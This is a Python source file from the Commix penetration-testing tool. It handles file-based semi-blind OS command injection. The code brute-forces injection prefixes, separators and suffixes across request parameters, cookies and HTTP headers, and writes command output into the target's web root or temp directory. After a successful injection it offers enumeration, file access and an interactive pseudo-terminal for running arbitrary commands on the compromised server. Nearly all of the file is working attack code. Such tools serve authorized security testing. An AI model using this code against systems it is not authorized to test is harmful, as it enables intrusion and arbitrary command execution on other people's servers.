#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import string
import random
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.controller import shell_options
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_injector
from src.core.injections.semiblind.techniques.file_based import fb_payloads
from src.core.injections.semiblind.techniques.file_based import fb_enumeration
from src.core.injections.semiblind.techniques.file_based import fb_file_access
from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler

readline_error = False
if settings.IS_WINDOWS:
  try:
    import readline
  except ImportError:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
else:
  try:
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
  except ImportError:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
pass

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Check ff temp-based technique has failed, 
then use the "/tmp/" directory for tempfile-based technique.
"""
def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):
  if no_result == True:
    info_msg = "Trying to create a file, in temporary "
    info_msg += "directory (" + tmp_path + ") for command execution results.\n"
    sys.stdout.write(settings.print_info_msg(info_msg))
    call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)   
    return call_tfb
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  if settings.FILE_BASED_STATE != None:
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Deleting the created (" + OUTPUT_TEXTFILE + ") file.\n"
      sys.stdout.write(settings.print_debug_msg(debug_msg))
    if settings.TARGET_OS == "win":
      cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
    else:  
      cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + " " + settings.COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

"""
Provide custom server's root directory
"""
def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
  if settings.TARGET_OS == "win" :
    example_root_dir = "\\inetpub\\wwwroot"
  else:
    example_root_dir = "/var/www"
  question_msg = "Please provide the host's root directory (e.g. '" 
  question_msg += example_root_dir + "') > "
  settings.WEB_ROOT = _input(settings.print_question_msg(question_msg))
  if settings.WEB_ROOT.endswith(("\\", "/")):
    settings.WEB_ROOT = settings.WEB_ROOT[:-1]
  if len(settings.WEB_ROOT) == 0:
    settings.WEB_ROOT = example_root_dir
  if menu.options.web_root:
    menu.options.web_root = settings.WEB_ROOT
  settings.CUSTOM_WEB_ROOT = True

"""
Return TEMP path for win / *nix targets.
"""
def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
  # Set temp path 
  if settings.TARGET_OS == "win":
    if "microsoft-iis" in settings.SERVER_BANNER.lower():
      settings.TMP_PATH = "C:\\Windows\TEMP\\"
    else:
      settings.TMP_PATH = "%temp%\\"
  else:
    settings.TMP_PATH = "/tmp/"

  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH

  if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
    settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT

  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
    call_tmp_based = True
  else:
    if menu.options.web_root:
      settings.WEB_ROOT = menu.options.web_root
    else:
      # Debian/Ubunt have been updated to use /var/www/html as default instead of /var/www.
      if "apache" in settings.SERVER_BANNER.lower():
        if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
          try:
            check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
            if check_version[0] > "2.3" and not settings.TARGET_OS == "win":
              # Add "/html" to servers root directory
              settings.WEB_ROOT = settings.WEB_ROOT + "/html"
            else:
              settings.WEB_ROOT = settings.WEB_ROOT 
          except IndexError:
            pass
        # Add "/html" to servers root directory
        elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
          settings.WEB_ROOT = settings.WEB_ROOT + "/html"
        else:
          pass
      # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
      elif "nginx" in settings.SERVER_BANNER.lower():
        try:
          check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
          if check_version[0] >= "1.2.4":
            # Add "/html" to servers root directory
            settings.WEB_ROOT = settings.WEB_ROOT + "/html"
          else:
            # Add "/www" to servers root directory
            settings.WEB_ROOT = settings.WEB_ROOT + "/www"
        except IndexError:
          pass
      elif "microsoft-iis" in settings.SERVER_BANNER.lower():
        pass
      else:
        # Provide custom server's root directory.
        custom_web_root(url, timesec, filename, http_request_method, url_time_response)

      path = _urllib.parse.urlparse(url).path
      path_parts = path.split('/')
      count = 0
      for part in path_parts:        
        count = count + 1
      count = count - 1
      last_param = path_parts[count]
      EXTRA_DIR = path.replace(last_param, "")
      settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR
      if settings.TARGET_OS == "win":
        settings.WEB_ROOT = settings.WEB_ROOT.replace("/","\\")
        
  return tmp_path

"""
The "file-based" injection technique handler
"""
def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response):
  shell = False
  counter = 1
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded = False
  stop_injection = False
  call_tmp_based = False
  next_attack_vector = False
  export_injection_info = False
  injection_type = "semi-blind command injection"
  technique = "file-based command injection technique"

  tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)

  if not settings.LOAD_SESSION or settings.RETEST == True: 
    TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
    info_msg = "Trying to create a file in '" + settings.WEB_ROOT 
    info_msg += "' for command execution results. "
    print(settings.print_info_msg(info_msg))

  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACE) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  # Check if defined alter shell
  alter_shell = menu.options.alter_shell
  for whitespace in settings.WHITESPACE:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:

          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          if settings.LOAD_SESSION:
            try:
              settings.FILE_BASED_STATE = True
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
              OUTPUT_TEXTFILE = TAG + ".txt"
              session_handler.notification(url, technique, injection_type)
              if technique == "tempfile-based injection technique":
                #settings.LOAD_SESSION = True
                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
            except TypeError:
              err_msg = "An error occurred while accessing session file ('"
              err_msg += settings.SESSION_FILE + "'). "
              err_msg += "Use the '--flush-session' option."
              print(settings.print_critical_msg(err_msg))
              raise SystemExit()

          if settings.RETEST == True:
            settings.RETEST = False
            from src.core.injections.results_based.techniques.classic import cb_handler
            cb_handler.exploitation(url, timesec, filename, http_request_method)
   
          if not settings.LOAD_SESSION:
            i = i + 1
            # The output file for file-based injection technique.
            OUTPUT_TEXTFILE = TAG + ".txt"    
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            try:
              # File-based decision payload (check if host is vulnerable).
              if alter_shell :
                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
              else:
                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
                      
              # Check if defined "--prefix" option.
              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Whitespace fixation
              payload = payload.replace(" ", whitespace)

              # Perform payload modification
              payload = checks.perform_payload_modification(payload)

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL == 1:
                payload_msg = payload.replace("\n", "\\n")
                print(settings.print_payload(payload_msg))
              # Check if defined "--verbose" option.
              elif settings.VERBOSITY_LEVEL >= 2:
                debug_msg = "Generating payload for the injection."
                print(settings.print_debug_msg(debug_msg))
                print(settings.print_payload(payload)) 

              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie header injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)

              # User-Agent HTTP Header Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent HTTP header injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)          

              # Referer HTTP Header Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to Referer HTTP header injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)

              # Host HTTP Header Injection
              elif settings.HOST_INJECTION == True:
                # Check if target host is vulnerable to Host HTTP header injection.
                vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                response = fb_injector.host_injection_test(url, vuln_parameter, payload)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom HTTP header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)

              # Find the directory.
              output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)
              time.sleep(timesec)
              
              try:

                # Check if defined extra headers.
                request = _urllib.request.Request(output)
                headers.do_check(request)

                # Evaluate test results.
                output = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
                html_data = output.read()
                shell = re.findall(r"" + TAG + "", str(html_data))

                if len(shell) != 0 and shell[0] == TAG and not settings.VERBOSITY_LEVEL != 0:
                  percent = settings.info_msg
                  info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "." + "" + percent + ""
                  sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                  sys.stdout.flush()

                if len(shell) == 0 :
                  raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)

              except _urllib.error.HTTPError as e:
                if str(e.getcode()) == settings.NOT_FOUND_ERROR:
                  percent = ((i*100)/total)
                  float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))

                  if call_tmp_based == True:
                    exit_loops = True
                    tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
                    tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
                    raise
                    
                  # Show an error message, after N failed tries.
                  # Use the "/tmp/" directory for tempfile-based technique.
                  elif i == int(menu.options.failed_tries) and no_result == True :
                    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
                    warn_msg = "It seems that you don't have permissions to "
                    warn_msg += "read and/or write files in '" + settings.WEB_ROOT + "'."  
                    sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
                    print("")
                    while True:
                      if not menu.options.batch:
                        question_msg = "Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > "
                        tmp_upload = _input(settings.print_question_msg(question_msg))
                      else:
                        tmp_upload = ""
                      if len(tmp_upload) == 0:
                         tmp_upload = "Y"
                      if tmp_upload in settings.CHOICE_YES:
                        exit_loops = True
                        settings.TEMPFILE_BASED_STATE = True
                        call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
                        if call_tfb != False:
                          return True
                        else:
                          if no_result == True:
                            return False
                          else:
                            return True
                      elif tmp_upload in settings.CHOICE_NO:
                        break
                      elif tmp_upload in settings.CHOICE_QUIT:
                        print("")
                        raise
                      else:
                        err_msg = "'" + tmp_upload + "' is not a valid answer."  
                        print(settings.print_error_msg(err_msg))
                        pass
                    continue
                  
                  else:
                    if exit_loops == False:
                      if settings.VERBOSITY_LEVEL == 0:
                        if str(float_percent) == "100.0":
                          if no_result == True:
                            percent = settings.FAIL_STATUS
                          else:
                            percent = ".. (" + str(float_percent) + "%)"
                        else:
                          percent = ".. (" + str(float_percent) + "%)"

                        info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "." + "" + percent + ""
                        sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                        sys.stdout.flush()
                        continue
                      else:
                        continue
                    else:
                      raise
                  
                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:
                  err_msg = "Authorization required!"
                  print(settings.print_critical_msg(err_msg) + "\n")
                  raise SystemExit()
                  
                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:
                  err_msg = "You don't have permission to access this page."
                  print(settings.print_critical_msg(err_msg) + "\n")
                  raise SystemExit()
              
            except KeyboardInterrupt:
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise

            except SystemExit: 
              if 'vuln_parameter' in locals():
                # Delete previous shell (text) files (output)
                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise

            except _urllib.error.URLError as e: 
              warn_msg = "It seems that you don't have permissions to "
              warn_msg += "read and/or write files in '" + settings.WEB_ROOT + "'."
              sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
              err_msg = str(e).replace(": "," (") + ")."
              if menu.options.verbose > 1:
                print("")
              print(settings.print_critical_msg(err_msg))
              # Provide custom server's root directory.
              custom_web_root(url, timesec, filename, http_request_method, url_time_response)
              continue
            
            except:
              raise
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if shell:
            settings.FILE_BASED_STATE = True
            found = True
            no_result = False
            # Check injection state
            settings.DETECTION_PHASE = False
            settings.EXPLOITATION_PHASE = True
            if not settings.VERBOSITY_LEVEL != 0 and \
               not menu.options.alter_shell and \
               not next_attack_vector:
              next_attack_vector = True

            if settings.COOKIE_INJECTION == True: 
              header_name = " cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " parameter"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.HOST_INJECTION == True: 
              header_name = "Host"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.CUSTOM_HEADER_INJECTION == True: 
              header_name = " " + settings.CUSTOM_HEADER_NAME
              found_vuln_parameter = ""
              the_type = " HTTP header"

            else:
              header_name = ""
              the_type = " parameter"
              if http_request_method == "GET":
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1

            if not settings.LOAD_SESSION:
              if settings.VERBOSITY_LEVEL == 0:
                print("")
              else:
                checks.total_of_requests()

            # Print the findings to terminal.
            info_msg = "The"
            if len(found_vuln_parameter) > 0 and not "cookie" in header_name : 
              info_msg += " " + http_request_method 
            info_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML] + the_type + header_name
            info_msg += found_vuln_parameter + " seems injectable via "
            info_msg += "(" + injection_type.split(" ")[0] + ") " + technique + "."
            print(settings.print_bold_info_msg(info_msg))
            sub_content = str(checks.url_decode(payload))
            print(settings.print_sub_content(sub_content))
            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
            else:
              whitespace = settings.WHITESPACE[0]
              settings.LOAD_SESSION = False 

            # Check for any enumeration options.
            new_line = True
            if settings.ENUMERATION_DONE == True :
              while True:
                if not menu.options.batch:
                  question_msg = "Do you want to enumerate again? [Y/n] > "
                  enumerate_again = _input("\n" + settings.print_question_msg(question_msg)).lower()
                else:
                  enumerate_again = ""  
                if len(enumerate_again) == 0:
                  enumerate_again = "Y"
                if enumerate_again in settings.CHOICE_YES:
                  fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  # print("")
                  break
                elif enumerate_again in settings.CHOICE_NO:
                  new_line = False
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  raise SystemExit()
                else:
                  err_msg = "'" + enumerate_again + "' is not a valid answer."
                  print(settings.print_error_msg(err_msg))
                  pass
            else:
              if menu.enumeration_options():
                fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
           
            if not menu.file_access_options() and not menu.options.os_cmd:
              if not settings.VERBOSITY_LEVEL != 0 and new_line:
                print("")

            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True :
              if settings.ENUMERATION_DONE != True:
                print("")
              while True:
                if not menu.options.batch:
                  question_msg = "Do you want to access files again? [Y/n] > "
                  file_access_again = _input(settings.print_question_msg(question_msg))
                else:
                  file_access_again = ""
                if len(file_access_again) == 0:
                   file_access_again= "Y"
                if file_access_again in settings.CHOICE_YES:
                  fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  print("")
                  break
                elif file_access_again in settings.CHOICE_NO: 
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  raise SystemExit()
                else:
                  err_msg = "'" + enumerate_again + "' is not a valid answer."
                  print(settings.print_error_msg(err_msg))
                  pass
            else:
              if menu.file_access_options():
                # if not menu.enumeration_options():
                #   print("")
                fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                print("")
               
            # Check if defined single cmd.
            if menu.options.os_cmd:
              # if not menu.file_access_options():
              #   print("")
              fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise SystemExit()

            try:
              # Pseudo-Terminal shell
              go_back = False
              go_back_again = False
              while True:
                # Delete previous shell (text) files (output)
                # if settings.VERBOSITY_LEVEL != 0:
                #   print("")
                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                if settings.VERBOSITY_LEVEL != 0:
                  print("")
                if go_back == True:
                  break
                if not menu.options.batch:
                  question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
                  gotshell = _input(settings.print_question_msg(question_msg))
                else:
                  gotshell = ""
                if len(gotshell) == 0:
                   gotshell = "Y"
                if gotshell in settings.CHOICE_YES:
                  if not menu.options.batch:
                    print("")
                  print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
                  if readline_error:
                    checks.no_readline_module()
                  while True:
                    # Tab compliter
                    if not readline_error:
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    # if settings.VERBOSITY_LEVEL != 0:
                    #   print("")
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)
                      if go_back and go_back_again == False:
                        break
                      if go_back and go_back_again:
                        return True 
                    else:
                      time.sleep(timesec)
                      response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Command execution results.
                        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
                        shell = "".join(str(p) for p in shell)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                      if shell:
                        if shell != "":
                          # Update logs with executed cmds and execution results.
                          logs.executed_command(filename, cmd, shell)
                          print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n")

                      if not shell or shell == "":
                        if settings.VERBOSITY_LEVEL != 0:
                          print("")
                        err_msg = "The '" + cmd + "' command, does not return any output."
                        print(settings.print_critical_msg(err_msg) + "\n")

                elif gotshell in settings.CHOICE_NO:
                  if checks.next_attack_vector(technique, go_back) == True:
                    break
                  else:
                    if no_result == True:
                      return False 
                    else:
                      return True  

                elif gotshell in settings.CHOICE_QUIT:
                  # Delete previous shell (text) files (output)
                  delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                  raise SystemExit()
                else:
                  err_msg = "'" + gotshell + "' is not a valid answer."  
                  print(settings.print_error_msg(err_msg))
                  pass
              
            except KeyboardInterrupt: 
              # if settings.VERBOSITY_LEVEL != 0:
              print("")
              # Delete previous shell (text) files (output)
              delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
              raise
              
  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      print("")
    return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, url_time_response):
  if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response) == False:
    return False

# eof
